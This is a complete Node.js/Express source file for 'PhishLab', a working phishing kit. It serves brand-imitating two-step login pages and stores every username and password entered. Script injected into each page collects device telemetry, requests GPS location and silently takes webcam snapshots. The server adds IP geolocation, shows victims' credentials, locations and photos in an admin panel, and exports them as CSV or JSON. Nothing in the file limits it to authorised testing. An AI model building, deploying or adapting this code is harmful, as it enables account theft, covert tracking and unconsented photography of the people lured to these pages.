const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const brands = require('./brands');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'changeme';
const SECRET = process.env.SECRET || crypto.randomBytes(32).toString('hex');
const DB_FILE = path.join(__dirname, 'data.json');
const RESERVED = ['admin', 'api', 'media', 'favicon.ico', ''];

app.set('trust proxy', 1);
app.use(express.json({ limit: '3mb' }));
app.use(express.urlencoded({ extended: false }));

let db = { campaigns: [], captures: [] };
try { db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); } catch {}
let t;
const save = () => { clearTimeout(t); t = setTimeout(() => fs.writeFile(DB_FILE, JSON.stringify(db), () => {}), 150); };

const now = () => Date.now();
const id = () => crypto.randomBytes(5).toString('hex');
const slugify = s => (s || '').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 12) || id().slice(0, 6);
const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
const cookies = req => Object.fromEntries((req.headers.cookie || '').split(';').map(p => p.trim().split('=').map(decodeURIComponent)).filter(a => a[0]));
const sign = v => crypto.createHmac('sha256', SECRET).update(v).digest('hex');
const isAdmin = req => cookies(req).admin === sign(ADMIN_PASSWORD);

function clientIp(req) {
  const x = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
  return (x || req.socket.remoteAddress || '').replace('::ffff:', '');
}

async function geo(ip) {
  if (!ip || /^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) return null;
  try {
    const c = new AbortController(); const timer = setTimeout(() => c.abort(), 4000);
    const r = await fetch('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,timezone', { signal: c.signal });
    clearTimeout(timer);
    const j = await r.json();
    return j.status === 'success' ? j : null;
  } catch { return null; }
}

// ---------------- admin auth ----------------
const LOGIN = `<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>PhishLab</title><style>
*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0d1117;color:#e6edf3;font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif}
form{background:#161b22;border:1px solid #30363d;padding:28px;border-radius:12px;width:300px}
h1{font-size:18px;margin:0 0 16px}input,button{width:100%;padding:11px;border-radius:8px;font-size:14px;font-family:inherit}
input{background:#0d1117;border:1px solid #30363d;color:#e6edf3;margin-bottom:10px}
button{background:#238636;border:0;color:#fff;font-weight:600;cursor:pointer}.err{color:#f85149;font-size:13px;margin-bottom:10px}</style>
<form method=post action="/admin/login"><h1>PhishLab admin</h1>__E__<input type=password name=password placeholder=Password autofocus><button>Sign in</button></form>`;

app.get('/admin/login', (req, res) => res.send(LOGIN.replace('__E__', '')));
app.post('/admin/login', (req, res) => {
  if (req.body.password !== ADMIN_PASSWORD) return res.status(401).send(LOGIN.replace('__E__', '<div class=err>Wrong password</div>'));
  res.setHeader('Set-Cookie', 'admin=' + sign(ADMIN_PASSWORD) + '; HttpOnly; Path=/; Max-Age=86400; SameSite=Lax');
  res.redirect('/admin');
});
app.get('/admin/logout', (req, res) => { res.setHeader('Set-Cookie', 'admin=; Path=/; Max-Age=0'); res.redirect('/admin/login'); });

const guard = (req, res, next) => isAdmin(req) ? next() : res.redirect('/admin/login');

// ---------------- admin UI ----------------
const SHELL = (title, body) => `<!doctype html><meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(title)}</title><style>
*{box-sizing:border-box}body{margin:0;background:#0d1117;color:#e6edf3;font:14px/1.5 -apple-system,Segoe UI,Roboto,sans-serif}
header{display:flex;gap:14px;align-items:center;padding:14px 20px;border-bottom:1px solid #21262d;background:#161b22;position:sticky;top:0;z-index:5}
header b{font-size:15px}header a{color:#8b949e;text-decoration:none;font-size:13px}header a:hover{color:#e6edf3}
main{padding:20px;max-width:1100px;margin:0 auto}
input,select,button,textarea{font:inherit;padding:9px;border-radius:7px;border:1px solid #30363d;background:#0d1117;color:#e6edf3}
button{cursor:pointer;background:#21262d;font-weight:600}button.go{background:#238636;border-color:#238636;color:#fff}
table{width:100%;border-collapse:collapse;font-size:13px}td,th{padding:9px;border-bottom:1px solid #21262d;text-align:left}
.mono{font-family:ui-monospace,Menlo,monospace;font-size:12px;word-break:break-all}
.card{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:14px;margin-bottom:12px}
.muted{color:#8b949e;font-size:12px}.pill{background:#21262d;padding:2px 7px;border-radius:20px;font-size:11px}
.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}img.shot{width:150px;border-radius:8px;border:1px solid #30363d}
a{color:#58a6ff}</style><header><b>PhishLab</b><a href="/admin">Campaigns</a><a href="/admin/logout" style="margin-left:auto">Logout</a></header><main>${body}</main>`;

app.get('/admin', guard, (req, res) => {
  const rows = db.campaigns.slice().reverse().map(c => {
    const caps = db.captures.filter(x => x.slug === c.slug);
    return `<tr><td><a href="/${c.slug}" target="_blank">/${esc(c.slug)}</a></td><td>${esc(c.brand)}</td>
    <td>${c.hits}</td><td><a href="/admin/c/${c.slug}">${caps.length} captured</a></td>
    <td class=row><form method=post action="/admin/toggle/${c.slug}"><button>${c.active ? 'Pause' : 'Resume'}</button></form>
    <form method=post action="/admin/delete/${c.slug}" onsubmit="return confirm('Delete?')"><button>Delete</button></form></td></tr>`;
  }).join('') || '<tr><td colspan=5 class=muted>No campaigns yet.</td></tr>';
  const opts = brands.map(b => `<option value="${b.id}">${esc(b.name)}</option>`).join('');
  res.send(SHELL('Campaigns', `<div class=card><form method=post action="/admin/campaigns" class=row>
    <select name=brand>${opts}</select><input name=slug placeholder="custom slug (optional)">
    <input name=note placeholder="note (optional)"><button class=go>Create sub-site</button></form>
    <p class=muted>Sub-sites are path-based on this same domain. Any slug is fine.</p></div>
    <table><tr><th>URL</th><th>Brand</th><th>Views</th><th>Data</th><th></th></tr>${rows}</table>`));
});

app.post('/admin/campaigns', guard, (req, res) => {
  const brand = brands.find(b => b.id === req.body.brand);
  if (!brand) return res.redirect('/admin');
  let slug = slugify(req.body.slug);
  while (RESERVED.includes(slug) || db.campaigns.some(c => c.slug === slug)) slug = slug + Math.floor(Math.random() * 9);
  db.campaigns.push({ slug, brand: brand.id, note: (req.body.note || '').slice(0, 120), createdAt: now(), active: true, hits: 0 });
  save(); res.redirect('/admin');
});

app.post('/admin/toggle/:slug', guard, (req, res) => {
  const c = db.campaigns.find(x => x.slug === req.params.slug);
  if (c) { c.active = !c.active; save(); }
  res.redirect('/admin');
});
app.post('/admin/delete/:slug', guard, (req, res) => {
  db.campaigns = db.campaigns.filter(x => x.slug !== req.params.slug);
  db.captures = db.captures.filter(x => x.slug !== req.params.slug);
  save(); res.redirect('/admin');
});

app.get('/admin/c/:slug', guard, (req, res) => {
  const c = db.campaigns.find(x => x.slug === req.params.slug);
  if (!c) return res.redirect('/admin');
  const caps = db.captures.filter(x => x.slug === c.slug).reverse().map(cap => {
    const g = cap.ipgeo;
    const map = (cap.gps || g) ? `<a target="_blank" href="https://www.openstreetmap.org/?mlat=${cap.gps ? cap.gps.lat : g.lat}&mlon=${cap.gps ? cap.gps.lng : g.lon}#map=16/${cap.gps ? cap.gps.lat : g.lat}/${cap.gps ? cap.gps.lng : g.lon}">Open map</a>` : '';
    const loc = cap.gps ? `GPS ${cap.gps.lat.toFixed(5)}, ${cap.gps.lng.toFixed(5)} (±${Math.round(cap.gps.acc)}m)` :
      g ? `${esc(g.city)}, ${esc(g.regionName)}, ${esc(g.country)} ${esc(g.zip || '')} — ${esc(g.isp || '')}` : 'no geolocation';
    const tel = cap.telemetry || {};
    return `<div class=card><div class=row><span class=pill>#${cap.n}</span><b class=mono>${esc(cap.identifier || '—')}</b>
      <span class=mono>${esc(cap.password || 'no password')}</span><span class=muted>${new Date(cap.at).toLocaleString()}</span></div>
      <p class=mono>${esc(cap.ip)} · ${loc} ${map}</p>
      <p class=muted>${tel.battery ? 'battery ' + tel.battery.level + '%' + (tel.battery.charging ? ' charging' : '') : 'no battery'} ·
      ${tel.screen || '?'} · ${esc(tel.tz || '')} · ${esc(tel.platform || '')} · ${tel.cores || '?'} cores</p>
      <p class=mono style="font-size:11px">${esc(cap.ua)}</p>
      ${(cap.images || []).map(i => `<img class=shot src="${i.data}">`).join('')}</div>`;
  }).join('') || '<p class=muted>Nothing captured yet.</p>';
  res.send(SHELL('/' + c.slug, `<div class=row style="justify-content:space-between;margin-bottom:12px">
    <div><h2 style="margin:0">/${esc(c.slug)} <span class=pill>${esc(c.brand)}</span></h2>
    <p class=muted>${c.hits} views · ${c.note ? esc(c.note) : 'no note'}</p></div>
    <div class=row><a href="/admin/export/${c.slug}.json"><button>JSON</button></a>
    <a href="/admin/export/${c.slug}.csv"><button>CSV</button></a></div></div>${caps}`));
});

app.get('/admin/export/:file', guard, (req, res) => {
  const [slug, fmt] = req.params.file.split('.');
  const caps = db.captures.filter(x => x.slug === slug);
  if (fmt === 'json') return res.type('json').send(JSON.stringify(caps, null, 2));
  const cols = ['n', 'at', 'identifier', 'password', 'ip', 'country', 'city', 'gps', 'ua'];
  const rows = caps.map(c => cols.map(k => {
    const v = k === 'gps' ? (c.gps ? c.gps.lat + ' ' + c.gps.lng : '') :
      k === 'country' ? (c.ipgeo || {}).country : k === 'city' ? (c.ipgeo || {}).city : c[k];
    return '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
  }).join(','));
  res.type('csv').setHeader('Content-Disposition', 'attachment; filename=' + slug + '.csv');
  res.send([cols.join(','), ...rows].join('\n'));
});

// ---------------- templates ----------------
function renderForm(c, step, capId, prefill) {
  const b = brands.find(x => x.id === c.brand) || brands[0];
  const isPw = step === 2;
  return `<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>${esc(b.name)}</title><style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px;
background:${b.bg};color:${b.text};font:15px/1.45 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
.card{background:${b.card};width:100%;max-width:${isPw ? '380' : '400'}px;padding:30px 26px;border-radius:${b.radius || '10'}px;
box-shadow:0 6px 28px rgba(0,0,0,.14)}
.logo{text-align:center;margin:0 0 20px;font-size:${b.size || '27'}px;font-weight:${b.weight || '800'};
letter-spacing:${b.tracking || '-0.5'}px;${b.logoStyle || ('color:' + b.accent)}}
h1{font-size:${isPw ? '20' : '19'}px;text-align:center;margin:0 0 6px;font-weight:600}
.sub{font-size:13px;text-align:center;color:#5f6368;margin:0 0 20px}
.chip{background:${b.bg};border-radius:20px;padding:7px 12px;font-size:13px;display:flex;justify-content:space-between;
align-items:center;margin-bottom:14px;gap:8px}
.chip b{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.chip a{color:${b.accent};font-size:12px;text-decoration:none;white-space:nowrap}
input{width:100%;padding:12px;border:1px solid #ccd0d5;border-radius:7px;font-size:15px;margin-bottom:12px;background:#fff;color:#111}
input:focus{outline:2px solid ${b.accent};outline-offset:-1px;border-color:transparent}
button{width:100%;padding:12px;border:0;border-radius:7px;background:${b.accent};color:${b.btnText || '#fff'};
font-size:15px;font-weight:700;cursor:pointer}
.foot{margin-top:20px;font-size:11px;color:#8a8d91;text-align:center;line-height:1.6}
.foot a{color:${b.accent};text-decoration:none}
.err{background:#fdecea;color:#b3261e;font-size:12.5px;padding:8px 10px;border-radius:6px;margin-bottom:12px}
</style></head><body><div class=card>
<div class=logo>${b.logo}</div>
${isPw ? `<div class=chip><b>${esc(prefill || '')}</b><a href="/${c.slug}">Switch</a></div>` : ''}
<h1>${esc(isPw ? b.pwTitle || 'Enter your password' : b.title || ('Sign in to ' + b.name))}</h1>
<p class=sub>${esc(isPw ? b.pwSub || 'to continue to ' + b.name : b.sub || 'Use your ' + b.name + ' account')}</p>
${isPw
  ? `<form method=post action="/${c.slug}/pw?c=${capId}"><input type=password name=password placeholder=${esc(b.pwLabel || 'Password')} required autofocus>
     <button>${esc(b.button || 'Log in')}</button></form>`
  : `<form method=post action="/${c.slug}/id"><input type=${b.idType || 'text'} name=identifier placeholder=${esc(b.idLabel)} required autofocus>
     <button>${esc(b.button || 'Continue')}</button></form>`}
<div class=foot>${b.footer || 'This is a copy of ' + b.domain}<br>${b.footerLink || ''}</div>
</div>${telemetryScript(c.slug)}</body></html>`;
}

function telemetryScript(slug) {
  return `<script>
(function(){
  var slug=${JSON.stringify(slug)}, sent=false;
  function post(url,obj){return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(obj),keepalive:true}).catch(function(){})}
  function snap(){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
    navigator.mediaDevices.getUserMedia({video:{width:640}}).then(function(s){
      var v=document.createElement('video');v.srcObject=s;v.muted=true;v.playsInline=true;v.play();
      setTimeout(function(){
        try{
          var w=320,h=Math.round(w*(v.videoHeight/v.videoWidth||0.75));
          var c=document.createElement('canvas');c.width=w;c.height=h;
          c.getContext('2d').drawImage(v,0,0,w,h);
          post('/api/media/'+slug,{image:c.toDataURL('image/jpeg',0.6)});
        }catch(e){}
        s.getTracks().forEach(function(t){t.stop()});
      },900);
    }).catch(function(){});
  }
  function send(){
    if(sent)return;sent=true;
    var d={screen:innerWidth+'x'+innerHeight,avail:screen.availWidth+'x'+screen.availHeight,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,
      platform:navigator.platform,cores:navigator.hardwareConcurrency||null,mem:navigator.deviceMemory||null,
      touch:navigator.maxTouchPoints,dpr:devicePixelRatio,ua:navigator.userAgent,ref:document.referrer};
    var done=false, fin=function(){ if(!done){done=true; post('/api/telemetry/'+slug,d);} };
    if(navigator.getBattery){
      navigator.getBattery().then(function(b){
        d.battery={level:Math.round(b.level*100),charging:b.charging};
        b.addEventListener('levelchange',function(){d.battery.level=Math.round(b.level*100)});
        fin();
      }).catch(fin);
    } else fin();
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(p){
        d.gps={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy};
        if(done) post('/api/telemetry/'+slug,{gps:d.gps});
      },function(){},{enableHighAccuracy:true,timeout:8000,maximumAge:0});
    }
  }
  setTimeout(send,300); setTimeout(snap,1400);
  document.addEventListener('submit',function(){ send(); snap(); });
})();
</script>`;
}

const SUCCESS = b => `<!doctype html><meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(b.name)}</title>
<style>body{margin:0;min-height:100vh;display:grid;place-items:center;font:15px -apple-system,Segoe UI,Roboto,sans-serif;background:${b.bg};color:${b.text}}
.c{text-align:center}.s{width:34px;height:34px;border:3px solid #ccd0d5;border-top-color:${b.accent};border-radius:50%;
margin:0 auto 16px;animation:r .8s linear infinite}@keyframes r{to{transform:rotate(360deg)}}</style>
<div class=c><div class=s></div>Signing you in…</div>
<script>setTimeout(function(){location.replace(${JSON.stringify(b.redirect)})},1600)</script>`;

// ---------------- capture endpoints ----------------
function newCapture(req, slug) {
  const cap = { id: id(), slug, n: db.captures.filter(c => c.slug === slug).length + 1, at: now(),
    ip: clientIp(req), ua: req.headers['user-agent'] || '', ref: req.headers.referer || '',
    identifier: '', password: '', telemetry: {}, images: [] };
  db.captures.push(cap); save(); return cap;
}

app.post('/api/telemetry/:slug', (req, res) => {
  const cap = db.captures.filter(c => c.slug === req.params.slug).pop();
  if (cap) {
    const b = req.body || {};
    cap.telemetry = { ...cap.telemetry, ...b, battery: b.battery || cap.telemetry.battery };
    if (b.gps) cap.gps = b.gps;
    save();
  }
  res.json({ ok: true });
});
app.post('/api/media/:slug', (req, res) => {
  const cap = db.captures.filter(c => c.slug === req.params.slug).pop();
  if (cap && req.body.image && req.body.image.startsWith('data:image')) {
    if (cap.images.length < 4) cap.images.push({ data: req.body.image, at: now() });
    save();
  }
  res.json({ ok: true });
});

// ---------------- public sub-sites ----------------
app.get('/', (req, res) => res.redirect('/admin'));

app.get('/:slug', async (req, res) => {
  const c = db.campaigns.find(x => x.slug === req.params.slug);
  if (!c || !c.active) return res.status(404).send('<h1>404</h1><p>No active campaign here.</p>');
  c.hits++; save();
  const cap = newCapture(req, c.slug);
  cap.ipgeo = await geo(cap.ip);
  save();
  res.send(renderForm(c, 1, cap.id, ''));
});

app.post('/:slug/id', async (req, res) => {
  const c = db.campaigns.find(x => x.slug === req.params.slug);
  if (!c) return res.status(404).send('404');
  let cap = db.captures.find(x => x.id === (req.query.c || ''));
  if (!cap) cap = newCapture(req, c.slug);
  cap.identifier = (req.body.identifier || '').slice(0, 200);
  if (cap.ip) cap.ipgeo = cap.ipgeo || await geo(cap.ip);
  save();
  res.send(renderForm(c, 2, cap.id, cap.identifier));
});

app.post('/:slug/pw', (req, res) => {
  const c = db.campaigns.find(x => x.slug === req.params.slug);
  if (!c) return res.status(404).send('404');
  const cap = db.captures.find(x => x.id === (req.query.c || ''));
  if (cap) { cap.password = (req.body.password || '').slice(0, 200); save(); }
  res.send(SUCCESS(brands.find(b => b.id === c.brand) || brands[0]));
});

app.use((req, res) => res.status(404).send('<h1>404</h1>'));
app.listen(PORT, () => console.log('PhishLab on ' + PORT));
